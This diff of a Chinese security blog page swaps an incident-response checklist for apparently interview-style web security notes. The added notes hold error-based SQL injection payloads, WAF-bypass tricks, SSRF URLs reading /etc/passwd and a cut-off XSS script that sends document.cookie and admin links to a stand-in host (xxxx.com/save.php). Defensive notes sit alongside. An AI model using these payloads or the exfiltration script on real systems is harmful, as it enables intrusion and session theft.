@@ -15,7 +15,7 @@
     <meta name="description" content="">
     <meta name="Cache-Control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
-    <title>windows 应急流程及实战演练 · Ywc&#39;s blog</title>
+    <title>Web安全知识整理 · Ywc&#39;s blog</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -210,7 +210,7 @@
                 <a href="/" >Ywc&#39;s blog</a>
             </div>
             <div class="post-title">
-                <a href="#" class="post-name">windows 应急流程及实战演练</a>
+                <a href="#" class="post-name">Web安全知识整理</a>
             </div>
     </div>
     
@@ -242,7 +242,7 @@ height:50vh;
         <h1 class="intro-title">
             <!-- 主页  -->
             
-            windows 应急流程及实战演练
+            Web安全知识整理
             <!-- 404 -->
             
         </h1>
@@ -261,18 +261,18 @@ height:50vh;
                 
                     <div class= post-intro-tags >
     
-        <a class="post-tag" href="javascript:void(0);" data-tags = "应急响应">应急响应</a>
+        <a class="post-tag" href="javascript:void(0);" data-tags = "learn">learn</a>
     
 </div>
                 
                 
                     <div class="post-intro-read">
-                        <span>Word count: <span class="post-count">2,224</span> / Reading time: <span class="post-count">8 min</span></span>
+                        <span>Word count: <span class="post-count">2,028</span> / Reading time: <span class="post-count">8 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
                     <span class="post-intro-calander iconfont-archer">&#xe676;</span>
-                    <span class="post-intro-time">2018/10/14</span>
+                    <span class="post-intro-time">2018/10/01</span>
                     
                     <span id="busuanzi_container_page_pv" class="busuanzi-pv">
                         <span class="iconfont-archer">&#xe602;</span>
@@ -396,200 +396,327 @@ height:50vh;
         <div class="container container-unloaded">
             <main class="main post-page">
     <article class="article-entry">
-        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本文摘自信安之路公众号的<a href="https://mp.weixin.qq.com/s?__biz=MzI5MDQ2NjExOQ==&amp;mid=2247488603&amp;idx=1&amp;sn=3233cc050ee4ef9344aac96356a4f5d4&amp;chksm=ec1e2473db69ad65ce50b9700d649a8d255c249a1317571d84c23e531c35b74e7bf4acb9e100&amp;mpshare=1&amp;scene=23&amp;srcid=1012sW8ziEE4JtFaRg9pku6J#rd" target="_blank" rel="noopener">文章</a>。</p>
-<p>当企业发生黑客入侵、系统崩溃或其它影响业务正常运行的安全事件时，急需第一时间进行处理，使企业的网络信息系统在最短时间内恢复正常工作，进一步查找入侵来源，还原入侵事故过程，同时给出解决方案与防范措施，为企业挽回或减少经济损失。  </p>
-<h2 id="常见的应急响应事件分类："><a href="#常见的应急响应事件分类：" class="headerlink" title="常见的应急响应事件分类："></a>常见的应急响应事件分类：</h2><p>web 入侵：网页挂马、主页篡改、Webshell</p>
-<p>系统入侵：病毒木马、勒索软件、远控后门</p>
-<p>网络攻击：DDOS 攻击、DNS 劫持、ARP 欺骗</p>
-<p>针对常见的攻击事件，结合工作中应急响应事件分析和解决的方法，总结了一些 Window 服务器入侵排查的思路。</p>
-<h2 id="0x01-入侵排查思路"><a href="#0x01-入侵排查思路" class="headerlink" title="0x01 入侵排查思路"></a>0x01 入侵排查思路</h2><h3 id="一、检查系统账号安全"><a href="#一、检查系统账号安全" class="headerlink" title="一、检查系统账号安全"></a>一、检查系统账号安全</h3><p><strong>1、查看服务器是否有弱口令，远程管理端口是否对公网开放。</strong></p>
-<p>检查方法：据实际情况咨询相关服务器管理员。</p>
-<p><strong>2、查看服务器是否存在可疑账号、新增账号。</strong></p>
-<p>检查方法：打开 cmd 窗口，输入lusrmgr.msc命令，查看是否有新增/可疑的账号，如有管理员群组的（Administrators）里的新增账户，如有，请立即禁用或删除掉。 </p>
-<p><strong>3、查看服务器是否存在隐藏账号、克隆账号。</strong></p>
-<p>检查方法：</p>
-<p>a、打开注册表 ，查看管理员对应键值。</p>
-<p>b、使用 D 盾 _web 查杀工具，集成了对克隆账号检测的功能。</p>
-<p><img src="/2018/10/14/windows-应急流程及实战演练/1.png" alt="windows-应急流程及实战演练"></p>
-<p><strong>4、结合日志，查看管理员登录时间、用户名是否存在异常。</strong></p>
-<p>检查方法：</p>
-<p>a、Win+R 打开运行，输入“eventvwr.msc”，回车运行，打开“事件查看器”。</p>
-<p>b、导出 Windows 日志–安全，利用 Log Parser 进行分析。</p>
-<p><img src="/2018/10/14/windows-应急流程及实战演练/2.png" alt="windows-应急流程及实战演练"></p>
-<h3 id="二、检查异常端口、进程"><a href="#二、检查异常端口、进程" class="headerlink" title="二、检查异常端口、进程"></a>二、检查异常端口、进程</h3><p><strong>1、检查端口连接情况，是否有远程连接、可疑连接。</strong></p>
-<p>检查方法：</p>
-<p>a、netstat -ano 查看目前的网络连接，定位可疑的 ESTABLISHED </p>
-<p>b、根据 netstat 定位出的 pid，再通过 tasklist 命令进行进程定位 tasklist  | findstr “PID”</p>
-<p><img src="/2018/10/14/windows-应急流程及实战演练/3.png" alt="windows-应急流程及实战演练"></p>
-<p><strong>2、进程</strong></p>
-<p>检查方法：</p>
-<p>a、开始–运行–输入<code>msinfo32</code>，依次点击“软件环境→正在运行任务”就可以查看到进程的详细信息，比如进程路径、进程 ID、文件创建日期、启动时间等。</p>
-<p>b、打开 D 盾 _web 查杀工具，进程查看，关注没有签名信息的进程。</p>
-<p>c、通过微软官方提供的 Process Explorer 等工具进行排查 。</p>
-<p>d、查看可疑的进程及其子进程。可以通过观察以下内容：</p>
-<blockquote>
-<p>没有签名验证信息的进程<br>没有描述信息的进程<br>进程的属主<br>进程的路径是否合法<br>CPU 或内存资源占用长时间过高的进程</p>
-</blockquote>
-<p><strong>3、小技巧：</strong></p>
-<p>a、查看端口对应的 PID： netstat -ano | findstr “port”</p>
-<p>b、查看进程对应的 PID：任务管理器–查看–选择列–PID 或者 <code>tasklist  | findstr &quot;PID&quot;</code></p>
-<p>c、查看进程对应的程序位置：</p>
-<blockquote>
-<p>任务管理器–选择对应进程–右键打开文件位置<br>运行输入 wmic，cmd界面 输入  process</p>
-</blockquote>
-<p>d、<code>tasklist /svc</code>   进程– PID –服务</p>
-<p>e、查看 Windows 服务所对应的端口：</p>
-<blockquote>
-<p>%system%/system32/drivers/etc/services（一般 %system%就是 C:\Windows）</p>
-</blockquote>
-<h3 id="三、检查启动项、计划任务、服务"><a href="#三、检查启动项、计划任务、服务" class="headerlink" title="三、检查启动项、计划任务、服务"></a>三、检查启动项、计划任务、服务</h3><p><strong>1、检查服务器是否有异常的启动项。</strong></p>
-<p>检查方法：</p>
-<p>a、登录服务器，单击【开始】&gt;【所有程序】&gt;【启动】，默认情况下此目录在是一个空目录，确认是否有非业务程序在该目录下。</p>
-<p>b、单击开始菜单 &gt;【运行】，输入 msconfig，查看是否存在命名异常的启动项目，是则取消勾选命名异常的启动项目，并到命令中显示的路径删除文件。</p>
-<p>c、单击【开始】&gt;【运行】，输入 regedit，打开注册表，查看开机启动项是否正常，特别注意如下三个注册表项：</p>
-<blockquote>
-<p>HKEY_CURRENT_USER\software\micorsoft\windows\currentversion\run<br>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run<br>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Runonce</p>
-</blockquote>
-<p>检查右侧是否有启动异常的项目，如有请删除，并建议安装杀毒软件进行病毒查杀，清除残留病毒或木马。</p>
-<p>d、利用安全软件查看启动项、开机时间管理等。</p>
-<p>e、组策略，运行 gpedit.msc。</p>
-<p><img src="/2018/10/14/windows-应急流程及实战演练/4.png" alt="windows-应急流程及实战演练"></p>
-<p><strong>2、检查计划任务</strong></p>
-<p>检查方法：</p>
-<p>a、单击【开始】&gt;【设置】&gt;【控制面板】&gt;【任务计划】，查看计划任务属性，便可以发现木马文件的路径。</p>
-<p>b、单击【开始】&gt;【运行】；输入 cmd，然后输入at，检查计算机与网络上的其它计算机之间的会话或计划任务，如有，则确认是否为正常连接。</p>
-<p><strong>3、服务自启动</strong></p>
-<p>检查方法：</p>
-<p>单击【开始】&gt;【运行】，输入 services.msc，注意服务状态和启动类型，检查是否有异常服务。</p>
-<h3 id="四、检查系统相关信息"><a href="#四、检查系统相关信息" class="headerlink" title="四、检查系统相关信息"></a>四、检查系统相关信息</h3><p><strong>1、查看系统版本以及补丁信息</strong></p>
-<p>检查方法：</p>
-<p>单击【开始】&gt;【运行】，输入 systeminfo，查看系统信息</p>
-<p><strong>2、查找可疑目录及文件</strong></p>
-<p>检查方法：</p>
-<p>a、 查看用户目录，新建账号会在这个目录生成一个用户目录，查看是否有新建用户目录。</p>
-<p>Window 2003: <code>C:\Documents and Settings</code></p>
-<p>Window 2008R2: <code>C:\Users\</code></p>
-<p>b、单击【开始】&gt;【运行】，输入<code>%UserProfile%\Recent</code>，分析最近打开分析可疑文件。</p>
-<p>c、在服务器各个目录，可根据文件夹内文件列表时间进行排序，查找可疑文件。</p>
-<h3 id="五、自动化查杀"><a href="#五、自动化查杀" class="headerlink" title="五、自动化查杀"></a>五、自动化查杀</h3><p><strong>病毒查杀</strong></p>
-<p>检查方法：</p>
-<p>下载安全软件，更新最新病毒库，进行全盘扫描。</p>
-<p><strong>webshell 查杀</strong></p>
-<p>检查方法：</p>
-<p>选择具体站点路径进行 webshell 查杀，建议使用两款 webshell 查杀工具同时查杀，可相互补充规则库的不足。</p>
-<h2 id="六、日志分析"><a href="#六、日志分析" class="headerlink" title="六、日志分析"></a>六、日志分析</h2><p><strong>系统日志</strong></p>
-<p>分析方法：</p>
-<p>a、前提：开启审核策略，若日后系统出现故障、安全事故则可以查看系统的日志文件，排除故障，追查入侵者的信息等</p>
-<p>b、Win+R 打开运行，输入<code>eventvwr.msc</code>，回车运行，打开“事件查看器”。</p>
-<p>c、导出应用程序日志、安全日志、系统日志，利用 Log Parser 进行分析。</p>
-<p><strong>WEB 访问日志</strong></p>
-<p>分析方法：</p>
-<p>a、找到中间件的 web 日志，打包到本地方便进行分析。</p>
-<p>b、推荐工具：</p>
-<p>Window 下，推荐用 EmEditor 进行日志分析，支持大文本，搜索效率还不错。</p>
-<p>Linux 下，使用 Shell 命令组合查询分析</p>
-<h2 id="0x02-工具篇"><a href="#0x02-工具篇" class="headerlink" title="0x02 工具篇"></a>0x02 工具篇</h2><h3 id="webshell-查杀："><a href="#webshell-查杀：" class="headerlink" title="webshell 查杀："></a>webshell 查杀：</h3><p>D盾_Web查杀：</p>
-<blockquote>
-<p><a href="http://www.d99net.net/index.asp" target="_blank" rel="noopener">http://www.d99net.net/index.asp</a></p>
-</blockquote>
-<p>河马 webshell 查杀：</p>
-<blockquote>
-<p><a href="http://www.shellpub.com" target="_blank" rel="noopener">http://www.shellpub.com</a></p>
-</blockquote>
-<p>深信服 Webshell 网站后门检测工具：</p>
-<blockquote>
-<p><a href="http://edr.sangfor.com.cn/backdoor_detection.html" target="_blank" rel="noopener">http://edr.sangfor.com.cn/backdoor_detection.html</a></p>
-</blockquote>
-<p>Safe3：</p>
-<blockquote>
-<p><a href="http://www.uusec.com/webshell.zip" target="_blank" rel="noopener">http://www.uusec.com/webshell.zip</a></p>
-</blockquote>
-<h3 id="病毒分析-："><a href="#病毒分析-：" class="headerlink" title="病毒分析 ："></a>病毒分析 ：</h3><p>PCHunter：</p>
-<blockquote>
-<p><a href="http://www.xuetr.com" target="_blank" rel="noopener">http://www.xuetr.com</a></p>
-</blockquote>
-<p>火绒剑：</p>
-<blockquote>
-<p><a href="https://www.huorong.cn" target="_blank" rel="noopener">https://www.huorong.cn</a></p>
-</blockquote>
-<p>Process Explorer：</p>
-<blockquote>
-<p><a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/process-explorer" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/sysinternals/downloads/process-explorer</a></p>
-</blockquote>
-<p>processhacker：</p>
-<blockquote>
-<p><a href="https://processhacker.sourceforge.io/downloads.php" target="_blank" rel="noopener">https://processhacker.sourceforge.io/downloads.php</a></p>
-</blockquote>
-<p>autoruns：</p>
-<blockquote>
-<p><a href="https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns</a></p>
-</blockquote>
-<p>OTL：</p>
-<blockquote>
-<p><a href="https://www.bleepingcomputer.com/download/otl/" target="_blank" rel="noopener">https://www.bleepingcomputer.com/download/otl/</a></p>
-</blockquote>
-<h3 id="病毒查杀："><a href="#病毒查杀：" class="headerlink" title="病毒查杀："></a>病毒查杀：</h3><p>卡巴斯基（推荐理由：绿色版、最新病毒库）：</p>
-<blockquote>
-<p><a href="http://devbuilds.kaspersky-labs.com/devbuilds/KVRT/latest/full/KVRT.exe" target="_blank" rel="noopener">http://devbuilds.kaspersky-labs.com/devbuilds/KVRT/latest/full/KVRT.exe</a>  </p>
-</blockquote>
-<p>大蜘蛛（推荐理由：扫描快、一次下载只能用1周，更新病毒库）：</p>
-<blockquote>
-<p><a href="http://free.drweb.ru/download+cureit+free" target="_blank" rel="noopener">http://free.drweb.ru/download+cureit+free</a></p>
-</blockquote>
-<p>火绒安全软件：</p>
-<blockquote>
-<p><a href="https://www.huorong.cn" target="_blank" rel="noopener">https://www.huorong.cn</a></p>
-</blockquote>
-<p>360杀毒：</p>
-<blockquote>
-<p><a href="http://sd.360.cn/download_center.html" target="_blank" rel="noopener">http://sd.360.cn/download_center.html</a></p>
-</blockquote>
-<h3 id="病毒动态："><a href="#病毒动态：" class="headerlink" title="病毒动态："></a>病毒动态：</h3><p>CVERC-国家计算机病毒应急处理中心：</p>
-<blockquote>
-<p><a href="http://www.cverc.org.cn" target="_blank" rel="noopener">http://www.cverc.org.cn</a></p>
-</blockquote>
-<p>微步在线威胁情报社区：</p>
-<blockquote>
-<p><a href="https://x.threatbook.cn" target="_blank" rel="noopener">https://x.threatbook.cn</a></p>
-</blockquote>
-<p>火绒安全论坛：</p>
-<blockquote>
-<p><a href="http://bbs.huorong.cn/forum-59-1.html" target="_blank" rel="noopener">http://bbs.huorong.cn/forum-59-1.html</a></p>
-</blockquote>
-<p>爱毒霸社区：</p>
-<blockquote>
-<p><a href="http://bbs.duba.net" target="_blank" rel="noopener">http://bbs.duba.net</a></p>
-</blockquote>
-<p>腾讯电脑管家：</p>
-<blockquote>
-<p><a href="http://bbs.guanjia.qq.com/forum-2-1.html" target="_blank" rel="noopener">http://bbs.guanjia.qq.com/forum-2-1.html</a></p>
-</blockquote>
-<h3 id="在线病毒扫描网站："><a href="#在线病毒扫描网站：" class="headerlink" title="在线病毒扫描网站："></a>在线病毒扫描网站：</h3><p>多引擎在线病毒扫描网 v1.02，当前支持 41 款杀毒引擎:</p>
-<blockquote>
-<p><a href="http://www.virscan.org" target="_blank" rel="noopener">http://www.virscan.org</a>  </p>
-</blockquote>
-<p>腾讯哈勃分析系统:</p>
-<blockquote>
-<p><a href="https://habo.qq.com" target="_blank" rel="noopener">https://habo.qq.com</a> </p>
-</blockquote>
-<p>Jotti 恶意软件扫描系统:</p>
-<blockquote>
-<p><a href="https://virusscan.jotti.org" target="_blank" rel="noopener">https://virusscan.jotti.org</a>   </p>
-</blockquote>
-<p>针对计算机病毒、手机病毒、可疑文件等进行检测分析:</p>
-<blockquote>
-<p><a href="http://www.scanvir.com" target="_blank" rel="noopener">http://www.scanvir.com</a>     </p>
-</blockquote>
-<h2 id="0x03-应急响应实战之-FTP-暴力破解"><a href="#0x03-应急响应实战之-FTP-暴力破解" class="headerlink" title="0x03 应急响应实战之 FTP 暴力破解"></a>0x03 应急响应实战之 FTP 暴力破解</h2><p>FTP 是一个文件传输协议，用户通过 FTP 可从客户机程序向远程主机上传或下载文件，常用于网站代码维护、日常源码备份等。如果攻击者通过 FTP 匿名访问或者弱口令获取FTP权限，可直接上传 webshell，进一步渗透提权，直至控制整个网站服务器。</p>
-<h3 id="应急场景"><a href="#应急场景" class="headerlink" title="应急场景"></a>应急场景</h3><p>从昨天开始，网站响应速度变得缓慢，网站服务器登录上去非常卡，重启服务器就能保证一段时间的正常访问，网站响应状态时而飞快时而缓慢，多数时间是缓慢的。针对网站服务器异常，系统日志和网站日志，是我们排查处理的重点。查看 Window 安全日志，发现大量的登录失败记录：</p>
+        <h2 id="PHP的字符串中单引号与双引号的区别"><a href="#PHP的字符串中单引号与双引号的区别" class="headerlink" title="PHP的字符串中单引号与双引号的区别"></a>PHP的字符串中单引号与双引号的区别</h2><p>“ “双引号里面的字段会经过编译器解释，然后再当作HTML代码输出。<br>‘ ‘单引号里面的不进行解释，直接输出。<br>双引号中的变量($var)和特殊字符(\r\n之类)会被转义，单引号中的内容不会被转义（所以效率更高）<br>单引号解析的时间比双引号快 。</p>
+<h2 id="同源策略"><a href="#同源策略" class="headerlink" title="同源策略"></a>同源策略</h2><p>同源策略是浏览器的一个安全功能，不同源的客户端脚本在没有明确授权的情况下，不能读写对方资源，同源是指，域名，协议，端口相同。</p>
+<h2 id="常见端口"><a href="#常见端口" class="headerlink" title="常见端口"></a>常见端口</h2><p>复习文章：<code>https://zhuanlan.zhihu.com/p/24926870</code></p>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">端口号</th>
+<th style="text-align:right">端口说明</th>
+<th style="text-align:center">攻击技巧</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">21/69</td>
+<td style="text-align:right">ftp/tftp:文件传输协议</td>
+<td style="text-align:center">爆破/嗅探/溢出/后门</td>
+</tr>
+<tr>
+<td style="text-align:left">22</td>
+<td style="text-align:right">ssh:远程连接</td>
+<td style="text-align:center">爆破OpenSSH；28个退格</td>
+</tr>
+<tr>
+<td style="text-align:left">23</td>
+<td style="text-align:right">talnet:远程连接</td>
+<td style="text-align:center">爆破\嗅探</td>
+</tr>
+<tr>
+<td style="text-align:left">25</td>
+<td style="text-align:right">smtp:邮件服务</td>
+<td style="text-align:center">邮件伪造</td>
+</tr>
+<tr>
+<td style="text-align:left">53</td>
+<td style="text-align:right">DNS：域名系统</td>
+<td style="text-align:center">DNS区域传输\DNS劫持\DNS缓存投毒\DNS欺骗\利用DNS隧道技术刺透防火墙</td>
+</tr>
+<tr>
+<td style="text-align:left">67/68</td>
+<td style="text-align:right">DHCP</td>
+<td style="text-align:center">劫持\欺骗</td>
+</tr>
+<tr>
+<td style="text-align:left">110</td>
+<td style="text-align:right">pop3</td>
+<td style="text-align:center">爆破</td>
+</tr>
+<tr>
+<td style="text-align:left">137/139/445</td>
+<td style="text-align:right">samba</td>
+<td style="text-align:center">可尝试爆破以及smb自身的各种远程执行类漏洞利用,如,ms08-067,ms17-010,嗅探等……</td>
+</tr>
+<tr>
+<td style="text-align:left">143</td>
+<td style="text-align:right">imap</td>
+<td style="text-align:center">爆破</td>
+</tr>
+<tr>
+<td style="text-align:left">161</td>
+<td style="text-align:right">snmp</td>
+<td style="text-align:center">爆破</td>
+</tr>
+<tr>
+<td style="text-align:left">389</td>
+<td style="text-align:right">ldap</td>
+<td style="text-align:center">注入攻击\未授权访问</td>
+</tr>
+<tr>
+<td style="text-align:left">443</td>
+<td style="text-align:right">SSL心脏滴血</td>
+<td style="text-align:center">web漏洞测试 </td>
+</tr>
+<tr>
+<td style="text-align:left">512/513/514</td>
+<td style="text-align:right">linux r</td>
+<td style="text-align:center">直接使用rlogin</td>
+</tr>
+<tr>
+<td style="text-align:left">873</td>
+<td style="text-align:right">rsync</td>
+<td style="text-align:center">未授权访问</td>
+</tr>
+<tr>
+<td style="text-align:left">1080</td>
+<td style="text-align:right">socket</td>
+<td style="text-align:center">爆破：进行内网渗透</td>
+</tr>
+<tr>
+<td style="text-align:left">1352</td>
+<td style="text-align:right">lotus</td>
+<td style="text-align:center">爆破：弱口令\信息泄漏：源代码</td>
+</tr>
+<tr>
+<td style="text-align:left">1433</td>
+<td style="text-align:right">mssql</td>
+<td style="text-align:center">爆破：使用系统用户登录\注入攻击</td>
+</tr>
+<tr>
+<td style="text-align:left">1521</td>
+<td style="text-align:right">oracle</td>
+<td style="text-align:center">爆破：TNS\注入攻击</td>
+</tr>
+<tr>
+<td style="text-align:left">2049</td>
+<td style="text-align:right">nfs</td>
+<td style="text-align:center">配置不当</td>
+</tr>
+<tr>
+<td style="text-align:left">2181</td>
+<td style="text-align:right">zookeeper</td>
+<td style="text-align:center">未授权访问</td>
+</tr>
+<tr>
+<td style="text-align:left">3306</td>
+<td style="text-align:right">mysql</td>
+<td style="text-align:center">爆破\拒绝服务\注入</td>
+</tr>
+<tr>
+<td style="text-align:left">3389</td>
+<td style="text-align:right">rdp</td>
+<td style="text-align:center">爆破\Shift后门</td>
+</tr>
+<tr>
+<td style="text-align:left">4848</td>
+<td style="text-align:right">glassfish</td>
+<td style="text-align:center">爆破：控制台弱口令\认证绕过</td>
+</tr>
+<tr>
+<td style="text-align:left">5000</td>
+<td style="text-align:right">sybase/DB2</td>
+<td style="text-align:center">爆破\注入 </td>
+</tr>
+<tr>
+<td style="text-align:left">5432</td>
+<td style="text-align:right">postgresql</td>
+<td style="text-align:center">缓冲区溢出\注入攻击\爆破：弱口令</td>
+</tr>
+<tr>
+<td style="text-align:left">5632</td>
+<td style="text-align:right">pcanywhere</td>
+<td style="text-align:center">拒绝服务\代码执行</td>
+</tr>
+<tr>
+<td style="text-align:left">5900</td>
+<td style="text-align:right">VNC</td>
+<td style="text-align:center">爆破：弱口令\认证绕过</td>
+</tr>
+<tr>
+<td style="text-align:left">6379</td>
+<td style="text-align:right">redis</td>
+<td style="text-align:center">未授权访问\爆破：弱口令</td>
+</tr>
+<tr>
+<td style="text-align:left">7001</td>
+<td style="text-align:right">weblogic</td>
+<td style="text-align:center">Java反序列化\控制台弱口令\控制台部署webshell</td>
+</tr>
+<tr>
+<td style="text-align:left">80/443/8080</td>
+<td style="text-align:right">web</td>
+<td style="text-align:center">常见web攻击\控制台爆破\对应服务器版本漏洞</td>
+</tr>
+<tr>
+<td style="text-align:left">8069</td>
+<td style="text-align:right">zabbix</td>
+<td style="text-align:center">远程命令执行</td>
+</tr>
+<tr>
+<td style="text-align:left">9090</td>
+<td style="text-align:right">websphere控制台</td>
+<td style="text-align:center">爆破：控制台弱口令\Java反序列</td>
+</tr>
+<tr>
+<td style="text-align:left">9200/9300</td>
+<td style="text-align:right">elasticsearch</td>
+<td style="text-align:center">远程代码执行</td>
+</tr>
+<tr>
+<td style="text-align:left">11211</td>
+<td style="text-align:right">memcacache</td>
+<td style="text-align:center">未授权访问</td>
+</tr>
+<tr>
+<td style="text-align:left">27017</td>
+<td style="text-align:right">mongodb</td>
+<td style="text-align:center">爆破\未授权访问</td>
+</tr>
+</tbody>
+</table>
+<h2 id="sql注入的原理-如何去进行防御sql注入"><a href="#sql注入的原理-如何去进行防御sql注入" class="headerlink" title="sql注入的原理,如何去进行防御sql注入"></a>sql注入的原理,如何去进行防御sql注入</h2><p>原理：当攻击者发送的sql语句被sql解释器执行，通过执行这些恶意语句欺骗数据库执行，导致数据库信息泄露。</p>
+<p>防御：</p>
+<ul>
+<li>使用预编译语句,绑定变量（PreparedStatement）</li>
+<li>使用存储过程</li>
+<li>检查数据类型</li>
+<li>使用安全函数</li>
+</ul>
+<h2 id="sql注入有哪几类"><a href="#sql注入有哪几类" class="headerlink" title="sql注入有哪几类"></a>sql注入有哪几类</h2><p>1.按照参数类型：数字型、字符型</p>
+<p>2.按照数据库返回结果：回显注入、报错注入、盲注</p>
+<p>3.按照注入位置及方式不同：post注入，get注入，cookie注入，盲注，延时注入，搜索注入，base64注入等</p>
+<h2 id="SQL注入报错注入指令"><a href="#SQL注入报错注入指令" class="headerlink" title="SQL注入报错注入指令"></a>SQL注入报错注入指令</h2><p><code>http://wyb0.com/posts/injection-of-error-based/</code></p>
+<p>报错注入只要套用公式即可，如下(第一个公式count(*)、floor()、rand()、group by不可或缺，后两个公式有32位的限制):</p>
+<p><code>?id=2’ and (select 1 from (select count(*),concat( floor(rand(0)*2),(select (select (查询语句)) from information_schema.tables limit 0,1))x from information_schema.tables group by x )a )--+</code></p>
+<p><code>?id=2’ and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)--+</code></p>
+<p><code>?id=1’ and extractvalue(1, concat(0x7e, (select @@version),0x7e))--+</code></p>
+<h2 id="XSS有哪几类"><a href="#XSS有哪几类" class="headerlink" title="XSS有哪几类"></a>XSS有哪几类</h2><p>1.反射型</p>
+<p>2.存储型</p>
+<p>3.DOMXSS</p>
+<h2 id="XSS防御"><a href="#XSS防御" class="headerlink" title="XSS防御"></a>XSS防御</h2><ul>
+<li>可在cookie中设置httponly（浏览器禁止页面的js访问带有httponly属性的cookie）</li>
+<li>xss filter（检查输入，设置白名单方式）</li>
+<li>输出检查（编码，转义，常用编码：html编码，js编码，16进制等)</li>
+<li>针对不同位置的输出，使用不同的处理方式</li>
+<li>处理富文本</li>
+<li>header中使用content-Sencurity-Policy字段，规定请求js的域名白名单（CSP策略）</li>
+</ul>
+<h2 id="dom-xss-和反射型xss的区别"><a href="#dom-xss-和反射型xss的区别" class="headerlink" title="dom xss 和反射型xss的区别"></a>dom xss 和反射型xss的区别</h2><p>dom xss 不需要服务器解析响应的直接参与，触发XSS靠的是浏览器端的DOM解析。dom型js代码存储在数据库中。</p>
+<h2 id="WAF绕过"><a href="#WAF绕过" class="headerlink" title="WAF绕过"></a>WAF绕过</h2><ul>
+<li>大小写混合</li>
+<li>URL编码</li>
+<li>关键字替换</li>
+<li>多参数请求拆分</li>
+<li>HTTP参数污染</li>
+<li>生僻函数</li>
+<li>注入参数到cookie</li>
+</ul>
+<h2 id="SSRF协议利用"><a href="#SSRF协议利用" class="headerlink" title="SSRF协议利用"></a>SSRF协议利用</h2><ul>
+<li>Dict 协议</li>
+</ul>
+<p><code>dict://fuzz.wuyun.org:8080/helo:dict</code></p>
+<ul>
+<li>Gopher 协议</li>
+</ul>
+<p><code>gopher://fuzz.wuyun.org:8080/gopher</code></p>
+<ul>
+<li>File 协议</li>
+</ul>
+<p><code>file:///etc/passwd</code></p>
+<h2 id="XXE防御、绕过"><a href="#XXE防御、绕过" class="headerlink" title="XXE防御、绕过"></a>XXE防御、绕过</h2><p>XXE:XML外部实体注入</p>
+<p>防御：</p>
+<p>1.使用开发语言提供的禁用外部实体的方法，即禁用外部实体。</p>
+<p>PHP:</p>
+<p><code>libxml_disable_entity_loader(true);</code></p>
+<p>JAVA:</p>
+<p><code>DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();</code></p>
+<p><code>dbf.setExpandEntityReferences(false);</code></p>
+<p>Python：</p>
+<p><code>from lxml import etree</code></p>
+<p><code>xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))</code></p>
+<p>2.过滤用户提交的XML数据</p>
+<p>关键词：&lt;!DOCTYPE和&lt;!ENTITY，或者，SYSTEM和PUBLIC。</p>
+<h2 id="IIS-5-x-6-0解析漏洞"><a href="#IIS-5-x-6-0解析漏洞" class="headerlink" title="IIS 5.x/6.0解析漏洞"></a>IIS 5.x/6.0解析漏洞</h2><p>1.目录解析</p>
+<p><code>/xx.asp/xx.jpg</code></p>
+<p>如：test.asp/test.jpg</p>
+<p>即：新建一个名为”test.asp”的目录,该目录中的任何文件都被IIS当做asp程序执行（特殊符号是”/“</p>
+<p>2.文件解析</p>
+<p><code>sp.asp;.jpg</code></p>
+<p>即分号后的不被解析,仍被IIS当做asp程序执行。</p>
+<h2 id="Apache-解析漏洞"><a href="#Apache-解析漏洞" class="headerlink" title="Apache 解析漏洞"></a>Apache 解析漏洞</h2><p>文件后缀，Apache 从右到左开始判断解析,如果为不可识别解析,就再往左判断.</p>
+<h2 id="XSS遇到后台登录限制或者HTTPONLY时"><a href="#XSS遇到后台登录限制或者HTTPONLY时" class="headerlink" title="XSS遇到后台登录限制或者HTTPONLY时"></a>XSS遇到后台登录限制或者HTTPONLY时</h2><p>复习文章：<code>https://blog.csdn.net/xysoul/article/details/45366695</code></p>
+<p><strong>1.可以利用XSS获取当前页面的所有URL</strong></p>
+<p>如：在某个后台插入了自己的js，等管理员看的时候，就得到了所有的url，后台往往有一些链接地址，都是各种管理的，之后我们需要辗转多次，来搜集一些敏感的链接，例如数据库备份，SMTP设置，管理员列表之类的。</p>
+<p>这些页面的作用：<br>1.数据库备份：没准能看到数据库或者备份的路径<br>2.SMTP设置：管理员邮箱，密码<br>3.管理员列表：有时候管理员密码会显示在此，即使不在，没准可以CSRF添加一个管理员</p>
+<p>js代码如下：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="built_in">document</span>.getElementsByTagName(<span class="string">"A"</span>);</span><br><span class="line"><span class="keyword">var</span> b = <span class="string">""</span>;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;a.length;i++)</span><br><span class="line">&#123;</span><br><span class="line">b+=a[i].href;</span><br><span class="line">b+=<span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line">postDATA=<span class="string">"cookie="</span>+<span class="built_in">escape</span>(<span class="built_in">document</span>.cookie)+<span class="string">"&amp;location="</span>+<span class="built_in">escape</span>(<span class="built_in">window</span>.location.href)+<span class="string">"&amp;top="</span>+<span class="built_in">escape</span>(top.location.href)+<span class="string">"&amp;urls="</span>+<span class="built_in">escape</span>(b);</span><br><span class="line">url=<span class="string">"http://xxxx.com/save.php"</span>;</span><br><span class="line">xmlHttp.open(<span class="string">"POST"</span>, url, <span class="literal">true</span>);</span><br><span 